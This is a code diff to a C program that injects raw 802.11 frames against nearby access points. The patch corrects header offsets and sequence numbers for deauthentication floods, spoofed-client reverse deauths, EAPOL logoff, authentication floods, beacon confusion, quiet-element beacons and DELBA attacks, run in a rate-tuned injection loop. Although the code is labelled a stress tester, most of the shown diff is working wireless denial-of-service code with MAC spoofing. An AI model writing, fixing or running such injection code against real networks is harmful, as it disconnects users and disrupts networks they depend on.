@@ -522,6 +522,17 @@ static const uint8_t BCAST[6] = {0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF};
 #define FC_CTS 0x00C4     /* Control: Clear To Send */
 #define FC_DATA_TODS 0x0108 /* [FIX 5] Data frame with ToDS */
 
+/* [FIX 47] Zero-copy byte offsets for in-place template modification.
+ * Calculated from packed struct sizes:
+ *   rt_hdr_t  = 10 bytes (ver:1 + pad:1 + len:2 + present:4 + tx_flags:2)
+ *   dot11_t   = 24 bytes (fc:2 + dur:2 + a1:6 + a2:6 + a3:6 + seq:2)
+ * All offsets are from buffer[0]. */
+#define OFF_A1  (sizeof(rt_hdr_t) + offsetof(dot11_t, a1))  /* 10 + 4  = 14 */
+#define OFF_A2  (sizeof(rt_hdr_t) + offsetof(dot11_t, a2))  /* 10 + 10 = 20 */
+#define OFF_A3  (sizeof(rt_hdr_t) + offsetof(dot11_t, a3))  /* 10 + 16 = 26 */
+#define OFF_SEQ (sizeof(rt_hdr_t) + offsetof(dot11_t, seq)) /* 10 + 22 = 32 */
+#define OFF_BODY (sizeof(rt_hdr_t) + sizeof(dot11_t))       /* 10 + 24 = 34 */
+
 /* [FIX 4] TX_FLAGS = NOACK(0x0008) | NOSEQ(0x0010) */
 static int mk_rt(uint8_t *b) {
   rt_hdr_t *h = (rt_hdr_t *)b;
@@ -3644,17 +3655,9 @@ static void *stress_injector_thread(void *arg) {
       tpl_eapol_len = mk_eapol_logoff(tpl_eapol, dummy_bss, dummy_cli);
   }
 
-  uint8_t tpl_quiet[MAX_PKT_SIZE];
-  if (a->cfg->vec_on[VEC_QUIET_ELEMENT]) {
-      uint8_t dummy_bss[6] = {0};
-      mk_quiet_beacon(tpl_quiet, dummy_bss, "dummy", 1);
-  }
-
-  uint8_t tpl_confusion[MAX_PKT_SIZE];
-  int tpl_confusion_len = 0;
-  if (a->cfg->vec_on[VEC_BEACON_CONFUSION]) {
-      tpl_confusion_len = mk_confusion_beacon(tpl_confusion, "dummy", 1);
-  }
+  /* [FIX 47] PID Auto-Tuner: per-thread local state (was `static` = data race on dual-radio) */
+  uint64_t pid_last_sent = 0;
+  uint64_t pid_last_fail = 0;
 
   while (!g_stop) {
     int nap = stress_pool_snapshot(a->pool, snap, STRESS_MAX_APS);
@@ -3684,13 +3687,11 @@ static void *stress_injector_thread(void *arg) {
 
       /* Build and inject selected vectors on-the-fly */
       if (a->cfg->vec_on[VEC_DEAUTH_FLOOD]) {
-        /* Broadcast deauth using Zero-Copy Template */
-        /* Overwrite addr1 (DA - already BCAST), addr2 (SA - BSSID), addr3 (BSSID) */
-        memcpy(tpl_deauth + 10, bss, 6); /* SA */
-        memcpy(tpl_deauth + 16, bss, 6); /* BSSID */
-        /* Overwrite sequence control (offset 22) */
-        uint16_t s_ctrl = htole16((seq++) << 4);
-        memcpy(tpl_deauth + 22, &s_ctrl, 2);
+        /* [FIX 47] Broadcast deauth using Zero-Copy Template with correct offsets */
+        memcpy(tpl_deauth + OFF_A2, bss, 6); /* addr2 = SA (BSSID) */
+        memcpy(tpl_deauth + OFF_A3, bss, 6); /* addr3 = BSSID */
+        uint16_t s_ctrl = htole16(((seq++) & 0xFFF) << 4);
+        memcpy(tpl_deauth + OFF_SEQ, &s_ctrl, 2);
         
         if (inject_one(sock, tpl_deauth, tpl_deauth_len) > 0) {
           atomic_fetch_add(&g_pkts_sent, 1);
@@ -3702,7 +3703,7 @@ static void *stress_injector_thread(void *arg) {
         /* Reverse deauth (client → AP spoof) - still dynamic due to random client mac */
         uint8_t fake_cli[6];
         rand_mac(fake_cli);
-        len = mk_deauth_rev(tmp, bss, fake_cli, 6, seq++);
+        len = mk_deauth_rev(tmp, bss, fake_cli, 6, (seq++) & 0xFFF);
         if (inject_one(sock, tmp, len) > 0) {
           atomic_fetch_add(&g_pkts_sent, 1);
           sent_for_ap++;
@@ -3724,10 +3725,10 @@ static void *stress_injector_thread(void *arg) {
       if (a->cfg->vec_on[VEC_EAPOL_LOGOFF]) {
         uint8_t fake_cli[6];
         rand_mac(fake_cli);
-        /* Zero-copy EAPOL logoff (modify ToDS addr1=RA=bss, addr2=SA=fake_cli, addr3=DA=bss) */
-        memcpy(tpl_eapol + 10, bss, 6);      /* addr1 */
-        memcpy(tpl_eapol + 16, fake_cli, 6); /* addr2 */
-        memcpy(tpl_eapol + 22, bss, 6);      /* addr3 */
+        /* [FIX 47] Zero-copy EAPOL logoff with correct offsets */
+        memcpy(tpl_eapol + OFF_A1, bss, 6);      /* addr1 = RA = BSSID */
+        memcpy(tpl_eapol + OFF_A2, fake_cli, 6); /* addr2 = SA = Client */
+        memcpy(tpl_eapol + OFF_A3, bss, 6);      /* addr3 = DA = BSSID */
         if (inject_one(sock, tpl_eapol, tpl_eapol_len) > 0) {
           atomic_fetch_add(&g_pkts_sent, 1);
           sent_for_ap++;
@@ -3756,15 +3757,10 @@ static void *stress_injector_thread(void *arg) {
       }
 
       if (a->cfg->vec_on[VEC_BEACON_CONFUSION]) {
-        /* Zero-copy Beacon Confusion: randomize BSSID directly in the template */
-        uint8_t fake_bssid[6];
-        rand_mac(fake_bssid);
-        /* In mk_confusion_beacon, addr2 and addr3 are the fake BSSID */
-        memcpy(tpl_confusion + 16, fake_bssid, 6); /* addr2 */
-        memcpy(tpl_confusion + 22, fake_bssid, 6); /* addr3 */
-        uint16_t s_ctrl = htole16((seq++) << 4);
-        memcpy(tpl_confusion + 28, &s_ctrl, 2); /* seq */
-        if (inject_one(sock, tpl_confusion, tpl_confusion_len) > 0) {
+        /* [FIX 47] Beacon Confusion: rebuild per-AP to handle variable SSID length */
+        const char *ssid = snap[i].ssid[0] ? snap[i].ssid : "Unknown";
+        len = mk_confusion_beacon(tmp, ssid, (uint8_t)snap[i].channel);
+        if (inject_one(sock, tmp, len) > 0) {
           atomic_fetch_add(&g_pkts_sent, 1);
           sent_for_ap++;
         } else {
@@ -3799,14 +3795,14 @@ static void *stress_injector_thread(void *arg) {
       }
 
       if (a->cfg->vec_on[VEC_AUTH_DOS]) {
-        /* Auth flood with random source MAC (zero-copy) */
+        /* [FIX 47] Auth flood with random source MAC (zero-copy, correct offsets) */
         uint8_t fake_cli[6];
         rand_mac(fake_cli);
-        memcpy(tpl_auth + 10, bss, 6);      /* addr1 */
-        memcpy(tpl_auth + 16, fake_cli, 6); /* addr2 */
-        memcpy(tpl_auth + 22, bss, 6);      /* addr3 */
-        uint16_t s_ctrl = htole16((seq++) << 4);
-        memcpy(tpl_auth + 28, &s_ctrl, 2);  /* seq */
+        memcpy(tpl_auth + OFF_A1, bss, 6);      /* addr1 = DA = BSSID */
+        memcpy(tpl_auth + OFF_A2, fake_cli, 6); /* addr2 = SA = Client */
+        memcpy(tpl_auth + OFF_A3, bss, 6);      /* addr3 = BSSID */
+        uint16_t s_ctrl = htole16(((seq++) & 0xFFF) << 4);
+        memcpy(tpl_auth + OFF_SEQ, &s_ctrl, 2);  /* seq */
         if (inject_one(sock, tpl_auth, tpl_auth_len) > 0) {
           atomic_fetch_add(&g_pkts_sent, 1);
           sent_for_ap++;
@@ -3837,26 +3833,8 @@ static void *stress_injector_thread(void *arg) {
       }
 
       if (a->cfg->vec_on[VEC_QUIET_ELEMENT]) {
-        /* Zero-copy Quiet Beacon */
+        /* [FIX 47] Quiet Beacon — rebuild per-AP (variable SSID length makes template unsafe) */
         const char *ssid = snap[i].ssid[0] ? snap[i].ssid : "Unknown";
-        int sl = strlen(ssid);
-        if (sl > MAX_SSID_LEN) sl = MAX_SSID_LEN;
-        
-        memcpy(tpl_quiet + 10, BCAST, 6); /* addr1 */
-        memcpy(tpl_quiet + 16, bss, 6);   /* addr2 */
-        memcpy(tpl_quiet + 22, bss, 6);   /* addr3 */
-        uint16_t s_ctrl = htole16((seq++) << 4);
-        memcpy(tpl_quiet + 28, &s_ctrl, 2); /* seq */
-        
-        /* Update BSSID, DS param and SSID length */
-        int o = 44; /* after beacon fixed params */
-        tpl_quiet[o+1] = sl; /* SSID len */
-        memcpy(tpl_quiet + o + 2, ssid, sl);
-        o += 2 + sl;
-        tpl_quiet[o+2] = (uint8_t)snap[i].channel; /* DS channel */
-        
-        /* We use the full original template length (might have trailing garbage if SSID is shorter, but mostly fine for testing, or we just dynamically build it like before but optimized. Wait, building is safer for variable length SSIDs. Let's just use mk_quiet_beacon but with less overhead).
-           Actually, mk_quiet_beacon is fast enough, the bottleneck was likely the usleep or too many loops. Let's stick to mk_quiet_beacon for now. */
         len = mk_quiet_beacon(tmp, bss, ssid, (uint8_t)snap[i].channel);
         if (inject_one(sock, tmp, len) > 0) {
           atomic_fetch_add(&g_pkts_sent, 1);
@@ -3867,23 +3845,24 @@ static void *stress_injector_thread(void *arg) {
       }
 
       if (a->cfg->vec_on[VEC_DELBA_ATTACK]) {
-        /* DELBA attack: iterate all 8 TIDs (0-7) and alternate direction (AP->BCAST, Client->AP) */
+        /* [FIX 47] DELBA attack: iterate all 8 TIDs, alternate direction.
+         * DELBA params offset = OFF_BODY + 2 (category + action) = 36 */
         uint8_t fake_cli[6];
         rand_mac(fake_cli);
         for (int tid = 0; tid < 8; tid++) {
           /* 1. AP -> Broadcast (Initiator=1, TID=tid) */
           len = mk_delba(tmp, bss, BCAST);
-          uint16_t params1 = htole16(0x0800 | (tid << 12)); /* bit11=1, bits12-15=TID */
-          memcpy(tmp + 32, &params1, 2); /* offset 32 is DELBA params in mk_delba */
+          uint16_t params1 = htole16(0x0800 | (tid << 12));
+          memcpy(tmp + OFF_BODY + 2, &params1, 2); /* [FIX 47] correct offset */
           if (inject_one(sock, tmp, len) > 0) {
             atomic_fetch_add(&g_pkts_sent, 1);
             sent_for_ap++;
           }
           
           /* 2. Client -> AP (Initiator=0, TID=tid) */
-          len = mk_delba(tmp, fake_cli, bss); /* swap addresses */
-          uint16_t params2 = htole16(0x0000 | (tid << 12)); /* bit11=0, bits12-15=TID */
-          memcpy(tmp + 32, &params2, 2);
+          len = mk_delba(tmp, fake_cli, bss);
+          uint16_t params2 = htole16(0x0000 | (tid << 12));
+          memcpy(tmp + OFF_BODY + 2, &params2, 2); /* [FIX 47] correct offset */
           if (inject_one(sock, tmp, len) > 0) {
             atomic_fetch_add(&g_pkts_sent, 1);
             sent_for_ap++;
@@ -4007,16 +3986,14 @@ static void *stress_injector_thread(void *arg) {
       usleep_precise(base_sleep);
     }
 
-    /* [FIX] PID Auto-Tuner for Buffer Bloat (Rate Controller) */
-    static uint64_t last_sent = 0;
-    static uint64_t last_fail = 0;
+    /* [FIX 47] PID Auto-Tuner for Buffer Bloat (Rate Controller) — per-thread local state */
     uint64_t curr_sent = atomic_load(&g_pkts_sent);
     uint64_t curr_fail = atomic_load(&g_pkts_fail);
     
-    uint64_t d_sent = curr_sent - last_sent;
-    uint64_t d_fail = curr_fail - last_fail;
-    last_sent = curr_sent;
-    last_fail = curr_fail;
+    uint64_t d_sent = curr_sent - pid_last_sent;
+    uint64_t d_fail = curr_fail - pid_last_fail;
+    pid_last_sent = curr_sent;
+    pid_last_fail = curr_fail;
 
     if (d_sent + d_fail > 100) { /* only adjust if we have enough sample size */
         double fail_rate = (double)d_fail / (double)(d_sent + d_fail);
